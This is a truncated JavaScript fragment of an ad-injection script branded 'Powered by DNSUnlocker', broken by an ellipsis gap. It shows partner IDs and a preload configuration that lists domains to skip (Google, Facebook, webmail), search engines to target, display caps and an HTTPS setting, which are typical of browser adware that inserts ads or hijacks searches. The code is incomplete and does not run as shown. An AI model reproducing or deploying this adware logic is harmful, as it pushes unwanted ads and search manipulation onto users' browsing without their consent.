(function(){if(window.visadd){var encoded_partner='14567722678';if(encoded_partner!=visadd.preload.encoded_partner){try{var sub_id='52001';if(encoded_partner=="14567725798"||encoded_partner=="14567725764"||encoded_partner=="14567725690"){if(typeof(vadims_sub_id)!='undefined'){sub_id=vadims_sub_id;}}
...
visadd.preload={domain_blacklist:';google;facebook;mail.aol.com;mail.yahoo.com;webmail;ads.yahoo.com;imprim-encre.com;cartouche.com;wikipedia.com;1800petmeds.com;',domain_restricted:'',domain_search:';bing.com;ask.com;search.yahoo.com;search.aol.com;google;',page_blacklist:'',encoded_partner:'14567722678',sub_id:'52001',unit_marker:'Powered by DNSUnlocker',unit_marker_url:'http://www.dnsunlocker.com',issued_request:false,search_term_to_use:null,over_cap:false,cap_x24:10,allow_https:false,language:function(){try{var lang_dict={"br":"pt","it":"it","es":"es","fr":"fr","de":"de","mx":"es","ar":"es","co":"es","cl":"es"};var curr_host=document.location.host;curr_host_split=curr_host.split(".")
